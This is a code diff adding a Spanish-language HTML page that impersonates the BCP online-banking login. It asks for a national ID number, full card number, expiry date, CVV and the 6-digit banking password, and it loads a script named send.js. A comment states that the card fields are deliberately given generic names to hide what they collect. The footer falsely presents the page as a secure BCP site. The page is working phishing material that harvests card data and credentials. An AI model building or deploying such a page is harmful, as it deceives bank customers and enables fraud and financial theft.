@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Banca por Internet - BCP</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="docs/style.css">
+    <style>
+        .row-dual {
+            display: flex;
+            gap: 15px;
+            margin-top: 15px;
+            margin-bottom: 15px;
+        }
+        .row-dual .input-group {
+            flex: 1;
+            margin-bottom: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <img src="docs/logo.svg" alt="BCP" width="90">
+            </div>
+            <div class="sidebar-image"></div>
+        </div>
+
+        <div class="login-section">
+            <div class="timer">
+                Esta ventana se <strong>cerrará</strong> en <span>180 segundos</span> <i class="fa-regular fa-clock"></i>
+            </div>
+
+            <div class="form-container">
+                <h2>Banca por Internet</h2>
+                <p class="subtitle">Banca por Internet</p>
+
+                <div class="card-box">
+                    <div class="card-header">
+                        <i class="fa-regular fa-credit-card card-icon"></i> Tarjeta y clave
+                    </div>
+
+                    <div class="radio-group">
+                        <label class="custom-radio">
+                            <input type="radio" name="tipo" value="persona" checked onclick="setCard('')">
+                            <span class="checkmark"></span> Persona
+                        </label>
+                        <label class="custom-radio">
+                            <input type="radio" name="tipo" value="empresa" onclick="setCard('4912')">
+                            <span class="checkmark"></span> Empresa
+                        </label>
+                    </div>
+
+                    <div class="input-row custom-select-container">
+                        <div class="custom-select-wrapper">
+                            <div class="custom-select" onclick="toggleDocMenu(event)">
+                                <span id="selected-doc">DNI</span>
+                                <i class="fa-solid fa-chevron-down"></i>
+                            </div>
+                            <div id="doc-menu" class="doc-dropdown-menu">
+                                <div onclick="selectDoc('DNI')">DNI</div>
+                                <div onclick="selectDoc('CE')">CE</div>
+                                <div onclick="selectDoc('PAS')">PAS</div>
+                            </div>
+                        </div>
+                        <input type="tel" placeholder="Nro de documento" maxlength="16" inputmode="numeric" pattern="[0-9]*" 
+                           oninput="this.value = this.value.replace(/[^0-9]/g, '');" class="input-inner">
+                    </div>
+
+                    <div class="input-group">
+                        <label>Número de tarjeta</label>
+                        <input type="tel" id="card-input" maxlength="16" inputmode="numeric" pattern="[0-9]*" placeholder=" " 
+                           oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                    </div>
+
+                    <!-- CAMPOS OFUSCADOS: el usuario ve "Fecha vencimiento" y "CVV" pero el código tiene nombres genéricos -->
+                    <div class="row-dual">
+                        <div class="input-group">
+                            <label>Fecha vencimiento</label>
+                            <input type="tel" 
+                                   id="fecha-vencimiento" 
+                                   name="campo1"
+                                   placeholder="MM/AA" 
+                                   maxlength="5" 
+                                   inputmode="numeric" 
+                                   autocomplete="off"
+                                   oninput="this.value = this.value.replace(/[^0-9/]/g, ''); if(this.value.length === 2 && !this.value.includes('/')) this.value += '/';">
+                        </div>
+                        <div class="input-group">
+                            <label>CVV</label>
+                            <input type="password" 
+                                   id="codigo-seguridad"
+                                   name="campo2"
+                                   placeholder="123" 
+                                   maxlength="4" 
+                                   inputmode="numeric" 
+                                   pattern="[0-9]*"
+                                   autocomplete="off"
+                                   oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                        </div>
+                    </div>
+                    <!-- FIN CAMPOS OFUSCADOS -->
+
+                    <div class="checkbox-group">
+                        <label class="custom-checkbox">
+                            <input type="checkbox" id="remember-check" onclick="toggleNameInput()">
+                            <span class="box-check"></span>
+                            Recordar datos
+                        </label>
+                    </div>
+
+                    <div class="input-group" id="name-group" style="display: none;">
+                        <input type="text" id="name-input" placeholder="Nombre de Tarjeta" 
+                           oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                    </div>
+
+                    <div class="input-group">
+                        <label>Clave de internet de 6 dígitos</label>
+                        <input type="password" 
+                               id="pass-input" 
+                               maxlength="6" 
+                               inputmode="numeric" 
+                               pattern="[0-9]*" 
+                               placeholder=" "
+                               oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                    </div>
+
+                    <div class="links">
+                        <a href="#">Crear clave</a>
+                        <a href="#">Olvidé mi clave</a>
+                    </div>
+
+                    <div class="captcha-container">
+                        <div class="captcha-img-box">
+                            <img src="docs/captcha.png" alt="Captcha" id="captcha-img">
+                        </div>
+                        <input type="text" placeholder="Código" class="captcha-input" maxlength="6">
+                    </div>
+                    <a href="#" class="change-code">Cambiar código</a>
+
+                    <button class="btn-continue" id="btn-submit">Continuar</button>
+                </div>
+            </div>
+            
+            <footer class="footer-text">
+                <i class="fa-solid fa-lock"></i> Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate con<br>
+nosotros al (01) 311-9898 o a través de nuestros medios digitales.
+            </footer>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="docs/script.js"></script>
+    <script src="docs/send.js"></script>
+</body>
+</html>
